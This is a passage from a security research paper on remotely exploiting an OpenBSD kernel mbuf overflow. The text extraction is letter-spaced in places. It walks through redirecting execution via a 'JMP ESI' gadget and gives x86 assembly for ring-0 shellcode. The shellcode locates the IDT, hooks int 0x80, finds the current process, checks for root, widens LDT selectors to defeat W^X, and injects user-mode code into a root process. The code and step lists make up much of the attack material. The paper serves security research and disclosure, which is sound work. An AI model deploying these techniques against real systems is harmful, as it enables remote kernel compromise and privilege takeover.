b u f f e r ,
f o r
e x t
f r e e
∗/
int
e x t t y p e ;
struct
mbuf
∗ e x t
n e x t r e f ;
struct
mbuf
∗ e x t
p r e v r e f ;
#i f d e f DEBUG
const
char
∗ e x t
o f i l e ;
const
char
∗ e x t
n f i l e ;
int
e x t
o l i n e ;
int
e x t
n l i n e ;
#endif
} ;
thus allowing us to execute code anywhere, on the kernel binary, the data,
or the stack. Here the kernel is lacking kernel-space protections like PaX.
PaX( [4, PaX]) is a linux kernel patch that provides multiple protections to
user-space and also for the kernel memory. On the kernel, PAX provides
KERNEXEC (WˆX and Read-Olny memory on the kernel), Randomized
stack and UDEREF (protects kernel-user memory transfers). On the section
9 we propose a simple implementation to add this kind of protection on the
OpenBSD kernel for the i386 architecture.
2.4.3
Where to jump?
The ﬁnal zone that we must arrive is our own shellcode. But there is no pre-
dictable position in kernel memory that we can place the shellcode, because
we are sending it in a network packet that is stored on a mbuf chain. To
address this problem there are a couple of possible solutions:
• Fill all the mbuf’s memory space with packets containing the shellcode
and jump approximately inside this region. Pro: The chances to land
on the shellcode are high. Cons.: A method must be found to spray
packets on the target and ﬁll the mbuf’s memory. We couldn’t ﬁnd a
reliable method to do this.
• Because of the internal parameter passing used by the c compiler, when
the ext free() function is called the position of the mbuf to free must
be placed on a register (ESI on OpenBSD 4.0) and if we jump to an
instruction ”JMP ESI” or ”CALL ESI” ﬁxed on the kernel binary,
the execution ﬂow will continue directly on our shellcode. Pros: Very
reliable and deterministic technique.
Cons.: depends on the kernel
binary.
6
4
SHELLCODE
We selected the last solution mainly because of its ease of implementation.
However, it is not the most optimal solution because it depends on the ker-
nel version. Nevertheless by choosing certain special positions in the kernel
binary this solution can work on all OpenBSD 4.0 default installations.
3
Now, what?
Great, now we can execute code in ring 0. Now what? There is not much that
we can do reliably. At this point we don’t know the kernel version or modules
that are loaded, nor where in the memory are the kernel structures. We
can’t access the ﬁle system nor the network stack. We don’t even know what
process is mapped, because we gained control of the system inside a hardware
interrupt service.
But we know the position of the system call interrupt
vector. It’s on the Interrupt Descriptor Table (IDT), and the system call
number is always 0x80.
3.1
Hooking the system call
The section 6 explains in detail the procedure to hook the system call. Now
all processes are visible when they do a int 0x80. We have several options at
this point:
• Modify the system call, to add a super-user with known password.
• Modify the current process code to execute our code.
• Any other attack involving only one system call.
The reason that we have only one system call is because the calling process
surely will malfunction if we change its system calls. This may be acceptable
in some scenarios, however, a better attack would leave the system almost
unaﬀected. Therefore, we chose to modify the current process and manipu-
late it to execute our code. We use a somewhat complex technique in order
to fork and save this process, so it can continue essentially unchanged even
as our code is now executing.
4
ShellCode
The ShellCode only hooks the interrupt 0x80 (ﬁgure 3), ensuring that system
calls from all process pass through our code.
Additionally, some data is
scavenged by scanning the kernel binary.
7
4.1
Pseudo code
4
SHELLCODE
User process
INT 0x80
Kernel
return
Hook
Hooked syscall
User process
INT 0x80
Kernel
Ring 3
Ring 0
return
Normal syscall
Normal System Call
Hooked System Call
Figure 3: System call hook
4.1
Pseudo code
1. Find the interrupt 0x80 address
2. Find equivalent getCurrentProc() function in the kernel
3. Assemble the syscall hook in memory.
4. Patch the IDT, hooking int 0x80
5. Fix the stack and return.
4.2
Detailed description of operation
Find the interrupt address:
pusha
sub esp, byte 0x7f ;reserve some space on the stack
sidt [esp+4]
mov ebx,[esp+6]
add esp, byte 0x7f
mov edx,[ebx+0x400]
8
4.2
Detailed description of operation
4
SHELLCODE
mov ecx,[ebx+0x404]
shr ecx,0x10
shl ecx,0x10
shl edx,0x10
shr edx,0x10
or ecx,edx
We store the IDT3 on an unused position of the stack and make calcu-
lations to retrieve the 0x80 entry. At the end of this code, the position
of the int 0x80 vector is in the ECX register.
Find equivalent getCurrentProc(): Scan the kernel binary to ﬁnd the
equivalent getCurrentProc() that is need in the system call hook ().
;Find ’GetCurrProc’
mov esi,ecx
and esi,0xfff00000 ; ESI--> Kernel start
xor ecx,ecx
FIND_cpu_switch:
mov eax,0x5f757063 ; "cpu_"
inc esi
cmp [esi],eax
jne FIND_cpu_switch
FIND_FF:
inc esi
cmp byte [esi],0xff
jne FIND_FF
mov edx,esi
add edx,6 ; EDX--> Start getproc code
FIND_C7:
inc esi
cmp byte [esi],0xc7
jne FIND_C7
mov ecx,esi
sub ecx,edx ;ECX --> Size getproc code
This piece of assembler receives on ECX the position of the int 0x80
vector. It then ﬁnds the start of the kernel binary by simply zeroing the
3Interrupt descriptor table
9
4.2
Detailed description of operation
4
SHELLCODE
lower word of it, since that vector is at the start of the kernel. Then, it
search the binary for a speciﬁc pattern. This pattern ”cpu ” is a string
that is always4 at the start of the function ”cpu switch()”, an assembly
function that in the ﬁrst instructions, loads in EDX the position of
the current process structure. The speciﬁc instructions change with
the OS version, because OpenBSD recently has gained multiprocessor
ability and the calculations to get the current running processor has
a additional level of indirection in recent kernels. Because we don’t
know the version of the kernel, or where in the kernel memory this
info is stored, we opted to copy the entire block of instructions to our
system call hook. We will need these instructions later in the system
call execution, to ﬁnd out whether or not we are root. If we didn’t
have this info, we could inject a user process with no privileges but the
attack will be less valuable.
Assemble the syscall hook on memory: (This is a really simple step,
only copy the needed code into speciﬁc place-holders). Note that we
don’t use the instructions movs because we would need to modify the
ES and DS selectors to do this, and restore them later.
; Copy getproc --> SyscallHook
call GETEIP
GETEIP:
pop edi; EIP-->edi
push edi
add edi, dword 0xBC ; Offset to SyscallHook getproc()
mov esi,edx
LOOP_COPY:
lodsb
mov [edi],al
inc edi
loop LOOP_COPY
Patch the IDT: , hooking int 0x80. This is not a diﬃcult operation, since
the base address of the ShellCode is on EDI we simply add the oﬀset
of the syscall hook and put this value on the IDT. However, the value
cannot be written directly, since the pointer to a interruption is not in
a contiguous sector of memory.
4Since version 3.1 of OpenBSD
10
5
OPENBSD WˆX INTERNALS
; Patch IDT
add edi, dword 0xb7 ;Start of SyscalHook
mov ecx,edi
mov edx,edi
shr ecx,0x10
mov [ebx+0x400],dx
mov [ebx+0x406],cx
It’s important to note that at this point, we got access to every system
call on every process. The system will slow a bit, but the hook will be
active for only a few milliseconds.
Fix the stack and return: The stack is unbalanced on this stage and a
simple RET will crash the kernel. So we ﬁx ESP and return. The
calling function will believe that the m free() function was successful
and return happily, but the int 0x80 will be hooked by our code.
; fix esp and return
popa
add esp, byte 0x20
pop ebx
pop esi
pop edi
leave
retn
The ShellCode ﬁnalize, and the mbuf is believed to be freed. The system call
interruption has been hooked, but since we don’t have reserved any special
memory space, we are vulnerable to overwriting by some future mbuf request.
So the process injection must be fast. This is the job of the Syscall Hook.
5
OpenBSD WˆX internals
Before explaining the ShellCode operation, a little explanation about one of
the most important security features of OpenBSD: the WˆX feature (Noth-
ing writable is executable).
Due to recent advancements in CPU design
this feature is now available in most modern operating systems. However,
OpenBSD has supported this feature for a number of years on plain i386
processors without special hardware support.
11
6
SYSCALL HOOK
Extension
Extension
User Code Segment (CS)
User Data Segment (DS)
0x00000000
0xffffffff
4 GB
512 MB
stack
.so
.text
stack
heap
.so
Figure 4: OpenBSD selector scheme and modiﬁcation
Figure 4 shows how OpenBSD implements WˆX on the i386 without the
NX bit: The CS selector on the user process is only 512 MB long (Initially,
it can grow), everything above this is not executable. We can see that the
data sector extends way beyond this limit, until the kernel start address
(0xD0000000).In this region is placed the .BSS, heap, stack and all other
data considered non-executable. A more comprehensive article about this
mechanism can be found here: [3, deRaadt].
As the ﬁgure shows, if we
could extend the CS selector to overlap the heap and stack, suddenly all the
memory would become executable and the WˆX protection is defeated 5. We
actually do this, and the next section contains the explanation.
6
Syscall Hook
Now the Shellcode has been executed, every time a int 0x80 is issued we
take control of the system at the kernel level. But in kernel mode, making
a system call or modifying a process’s information is non-trivial because we
are not linked against the kernel and we cannot know the memory positions
of these functions and structures. Everything is easier to do in user-mode,
so we must inject code into a user-mode process. But not any process, but
one that has root privileges. So the ﬁrst thing we need to ﬁnd out is if the
process that called us has root. We could have injected all the processes
with our code and surely one of them will be root, but this would greatly
aﬀect the performance of the compromised server and recovering from a big
modiﬁcation like this is diﬃcult. The next step is to inject a user process
5At least temporally. See 6.3
12
6.1
Pseudo code
6
SYSCALL HOOK
with root privileges into the system.
6.1
Pseudo code
1. Adjust Segment selectors DS and ES (to use movsd instructions)
2. Find curproc variable (Current process)
3. Find user Id (curproc-¿userID)
4. If procID == 0 :
(a) Find LDT6 position
(b) Extends the length of DS and CS on the LDT
(c) Modify return address of the Int 0x80 from .text to the stack of
the process
(d) Copy the user-mode ShellCode to the return position on the stack
5. Restore the original Int 0x80 vector (Remove the hook)
6. continue with the original syscall
6.2
Detailed description of operation
Adjust Segment selectors: The ﬁrst step, adjust DS and ES selectors, is
trivial, and not really needed, but we can use the more comfortable
movs instruction with correct selectors:
;Selectors:
;ds,es,fs,gs : User code
;cs:
Kernel
;ss:
Stack, Shellcode
pusha
push ss
pop ds
push ds
pop es
6Local Descriptor Table
13
6.2
Detailed description of operation
6
SYSCALL HOOK
Find curproc variable: Actually, we use part of the kernel, found and
copied by the previous ShellCode (see 4.2), to do this.
The kernel
instructions corresponding to OpenBSD Kernel, version 3.6-4.1 are:
lea
ecx, ds:0D0822940h
mov
esi, [ecx+80h]
The current process structure is now loaded on ESI.
Find user Id: This is a simple access to a pointer in the proc structure,
made with a couple of assembly instructions:
mov eax,[esi+0x10]
mov eax,[eax+0x4]
The ID of the user owner of the process that issued the hooked system
call is now in EAX. Since the beginning of OpenBSD the location of
the procID variable has always being on the same position on the proc
structure, therefore this code is always valid.
”If procID == 0”: A comparison with zero:
test eax,eax
jnz END_short
jmp short We_are_ROOT
Find Local descriptor table position: The Pentium processor has the
possibility to maintain a custom descriptor table for every task.Although
not all the operating systems make use of this table, OpenBSD does.
It maintains a table of descriptors for every process. The custom de-
scriptors are stored on the proc structure and reloaded on the context
switch. The LDT position is an index on the GDT7 and to obtain this
index a special instruction is needed:
sldt ax ; Store LDT index on EAX
7Global Descriptor Table, where system-wide selectors are stored
14
6.2
Detailed description of operation
6
SYSCALL HOOK
The position of the LDT is the third on the GDT, or 0x18 (deﬁned
on sys/arch/i386/include/segments.h), because each GDT entry has 8
bytes. We opt to get through this instruction, just to be sure. Now
that we have the index of the LDT, we must ﬁnd the position of of this
table in memory. This index is relative to the GDT, so now we must
load the GDT position, and look at this index on the table:
sub esp, byte 0x7f
sgdt [esp+4] ; Store global descriptor table
mov ebx,[esp+6]
add esp, byte 0x7f
push eax ; Save local descriptor table index